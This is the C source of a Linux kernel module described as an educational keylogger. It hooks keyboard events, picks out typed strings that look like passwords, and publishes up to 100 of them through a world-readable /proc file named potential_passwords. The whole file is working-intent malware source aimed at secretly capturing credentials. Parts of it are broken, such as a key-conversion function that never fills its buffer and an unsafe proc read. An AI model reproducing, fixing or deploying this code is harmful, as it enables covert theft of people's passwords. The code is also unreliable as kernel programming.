#include <linux/kernel.h>
#include <linux/keyboard.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/rbtree.h>
#include <linux/seq_file.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/input.h>
#include <linux/ctype.h>
#include <linux/notifier.h>

// Module information
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Logan Gray");
MODULE_DESCRIPTION("Keylogger for Educational Purposes");

// Define global module variables
#define BUFFER_SIZE 15
#define MAX_PASSWORDS 100
#define PROC_FILENAME "potential_passwords"

static const char *us_keymap[][2] = {
    {"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},       // 0-3
    {"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},                 // 4-7
    {"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},                 // 8-11
    {"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"},         // 12-14
    {"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
    {"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},                 // 20-23
    {"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},                 // 24-27
    {"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"},   // 28-31
    {"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},                 // 32-35
    {"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},                 // 36-39
    {"'", "\""}, {"`", "~"}, {"_LSHIFT_", "_LSHIFT_"}, {"\\", "|"}, // 40-43
    {"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},                 // 44-47
    {"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},                 // 48-51
    {".", ">"}, {"/", "?"}, {"_RSHIFT_", "_RSHIFT_"}, {"_PRTSCR_", "_KPD*_"},
    {"_LALT_", "_LALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},
    {"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},         // 60-63
    {"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},         // 64-67
    {"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"},   // 68-70
    {"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"}, // 71-73
    {"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"},         // 74-76
    {"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"},         // 77-79
    {"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"}, // 80-82
    {"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"},      // 83-85
    {"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"},     // 86-89
    {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
    {"\0", "\0"}, {"_KPENTER_", "_KPENTER_"}, {"_RCTRL_", "_RCTRL_"}, {"/", "/"},
    {"_PRTSCR_", "_PRTSCR_"}, {"_RALT_", "_RALT_"}, {"\0", "\0"},   // 99-101
    {"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"},   // 102-104
    {"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},
    {"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"},   // 108-110
    {"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},   // 111-114
    {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},         // 115-118
    {"_PAUSE_", "_PAUSE_"},                                         // 119
};

void keycode_to_string(int keycode, int shift_mask, char *buf, unsigned int buf_size)
{
    if (keycode > KEY_RESERVED && keycode <= KEY_PAUSE) {
        const char *us_key = (shift_mask == 1)
            ? us_keymap[keycode][1]
            : us_keymap[keycode][0];
    }
}

static struct proc_dir_entry* proc_file;

// A function that will track the key codes (amount defined in BUFFER_SIZE) typed on a keyboard and store them in an optimal data structure, acting as a buffer for analysis.
// Each element of the buffer will contain the character of the keypress. The function will be called whenever a key is pressed, updating the buffer.
// If the buffer reaches the limit defined in BUFFER_SIZE, it will call another function to analyze the buffer for potential passwords.
// The analysis function will check each element in the buffer for lowercase, uppercase, number, and symbol characters.
// If the buffer contains characters that meet 3 of the 4 criteria, it will add the characters as a single element in a database, which will track the last 100 passwords, and then clear the buffer.

// The character buffer will be implemented as a rolling buffer, meaning that once it reaches the maximum length, it will start overwriting the oldest characters with the newest ones, checking for potential passwords along the way.
// The database can be something simple like an array of strings, where each string represents a potential password. When the user reads the /proc file, they wil retrieve the contents of the database, which will contain the last 100 potential passwords.
// The overall goal is to make a simple keylogger program that logs potential passwords typed on a Linux system, implemented as a kernel module. Therefore, it is crucial to use kernel-specific functions and data structures.

void analyze_buffer(void);
ssize_t read_proc(struct file *filp, char *buf, size_t count, loff_t *offp);

// Define the password database structure
struct password_database {
    char passwords[MAX_PASSWORDS][BUFFER_SIZE + 1];
    int count;
};

struct password_database db;
int buffer_index = 0;
char buffer[BUFFER_SIZE + 1];

void analyze_buffer(void)
{
    printk(KERN_INFO "DEBUG: analyze_buffer() - START");
    int lowercase_count = 0;
    int uppercase_count = 0;
    int number_count = 0;
    int symbol_count = 0;

    for (int i = 0; i < BUFFER_SIZE; i++) {
        printk(KERN_INFO "DEBUG: analyze_buffer() - buffer[%d] = %s", i, buffer[i]);
        char c = buffer[i];

        if (islower(c)) {
            lowercase_count++;
        } else if (isupper(c)) {
            uppercase_count++;
        } else if (isdigit(c)) {
            number_count++;
        } else if (ispunct(c)) {
            symbol_count++;
        }
    }
    printk(KERN_INFO "DEBUG: analyze_buffer() - lowercase_count = %d", lowercase_count);
    printk(KERN_INFO "DEBUG: analyze_buffer() - uppercase_count = %d", uppercase_count);
    printk(KERN_INFO "DEBUG: analyze_buffer() - number_count = %d", number_count);
    printk(KERN_INFO "DEBUG: analyze_buffer() - symbol_count = %d", symbol_count);

    int criteria_met = 0;
    if (lowercase_count >= 1) criteria_met++;
    if (uppercase_count >= 1) criteria_met++;
    if (number_count >= 1) criteria_met++;
    if (symbol_count >= 1) criteria_met++;

    if (criteria_met >= 3) {
        printk(KERN_INFO "DEBUG: analyze_buffer() - Potential password found: %s", buffer);
        strncpy(db.passwords[db.count], buffer, BUFFER_SIZE);
        db.count++;
        if (db.count >= MAX_PASSWORDS) {
            db.count = 0;
        }
    }

    memset(buffer, 0, sizeof(buffer));
    buffer_index = 0;
    printk(KERN_INFO "DEBUG: analyze_buffer() - END");
}

int kb_notifier_fn(struct notifier_block *nblock, unsigned long code, void *_param)
{
    struct keyboard_notifier_param *param = _param;
    char keybuf[12] = {0};

    if (!(param->down)) return NOTIFY_OK;

    keycode_to_string(param->value, param->shift, keybuf, 12);

    if (strlen(keybuf) < 1) return NOTIFY_OK;

    printk(KERN_INFO "DEBUG: kb_notifier_fn() - keybuf = %s", keybuf);
    buffer[buffer_index] = keybuf;
    printk(KERN_INFO "DEBUG: kb_notifier_fn() - buffer[%d] = %s", buffer_index, buffer[buffer_index]);
    buffer_index++;
    if (buffer_index >= BUFFER_SIZE) {
        printk(KERN_INFO "DEBUG: kb_notifier_fn() - Buffer full, analyzing...");
        analyze_buffer();
    }

    return NOTIFY_OK;
}

ssize_t read_proc(struct file *filp, char *buf, size_t count, loff_t *offp)
{
    printk(KERN_INFO "DEBUG: read_proc() - START");
    int len = 0;
    int i;
    for (i = 0; i < db.count; i++) {
        len += sprintf(buf + len, "%s\n", db.passwords[i]);
    }
    printk(KERN_INFO "DEBUG: read_proc() - END");
    return len;
}

static struct notifier_block keylogger_nb = {
    notifier_call: kb_notifier_fn,
};

static struct proc_ops keylogger_proc_ops = {
    proc_read: read_proc,
};

static int __init keylogger_init(void)
{
    printk(KERN_INFO "Module loading...");
    proc_file = proc_create(PROC_FILENAME, 0666, NULL, &keylogger_proc_ops);
    if (!proc_file) return -ENOMEM;

    memset(&db, 0, sizeof(db));
    memset(buffer, 0, sizeof(buffer));

    register_keyboard_notifier(&keylogger_nb);

    printk(KERN_INFO "Module loaded");
    return 0;
}

static void __exit keylogger_exit(void)
{
    printk(KERN_INFO "Module unloading...");
    unregister_keyboard_notifier(&keylogger_nb);
    remove_proc_entry(PROC_FILENAME, NULL);
    printk(KERN_INFO "Module unloaded");
}

module_init(keylogger_init);
module_exit(keylogger_exit);
